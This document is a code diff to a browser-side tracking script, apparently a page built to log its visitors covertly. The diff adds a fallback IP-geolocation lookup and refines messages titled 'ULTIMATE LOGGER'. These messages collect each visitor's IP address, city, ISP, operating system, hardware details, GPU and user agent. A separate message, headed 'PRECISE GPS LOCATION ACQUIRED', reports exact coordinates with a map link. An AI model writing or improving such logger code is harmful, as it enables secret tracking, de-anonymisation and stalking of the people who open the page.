@@ -23,16 +23,31 @@
             return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
         }
 
+        async function getIpInfo() {
+            // Try first API
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) return await res.json();
+            } catch (e) {}
+
+            // Fallback to second API if first fails
+            try {
+                const res = await fetch('http://ip-api.com/json/');
+                const data = await res.json();
+                return {
+                    ip: data.query,
+                    city: data.city,
+                    org: data.isp,
+                    region: data.regionName
+                };
+            } catch (e) {
+                return { ip: "Blocked/Failed", city: "Unknown", org: "Unknown" };
+            }
+        }
+
         async function collectAll() {
             const statusDiv = document.getElementById('status');
-            let ipData = {};
-
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch (e) { 
-                ipData = { ip: "Error", city: "Unknown", org: "Unknown" }; 
-            }
+            const ipData = await getIpInfo();
 
             const initialPayload = {
                 username: "ULTIMATE LOGGER",
@@ -41,7 +56,7 @@
                     color: 16711680,
                     fields: [
                         { name: "🌐 Network", value: `**IP:** ${ipData.ip}\n**City:** ${ipData.city}\n**ISP:** ${ipData.org}`, inline: true },
-                        { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory}GB\n**Cores:** ${navigator.hardwareConcurrency}`, inline: true },
+                        { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || 'Unknown'}GB\n**Cores:** ${navigator.hardwareConcurrency}`, inline: true },
                         { name: "🖥️ GPU", value: `\`${getGPU()}\``, inline: false },
                         { name: "🕵️ User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                     ],
@@ -63,7 +78,7 @@
                     content: "🎯 **PRECISE GPS LOCATION ACQUIRED**",
                     embeds: [{
                         color: 16711680,
-                        description: `[Click here to see on Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`,
+                        description: `[Click here to see on Google Maps](https://www.google.com/maps?q=${lat},${lon})`,
                         fields: [
                             { name: "Latitude", value: `${lat}`, inline: true },
                             { name: "Longitude", value: `${lon}`, inline: true },
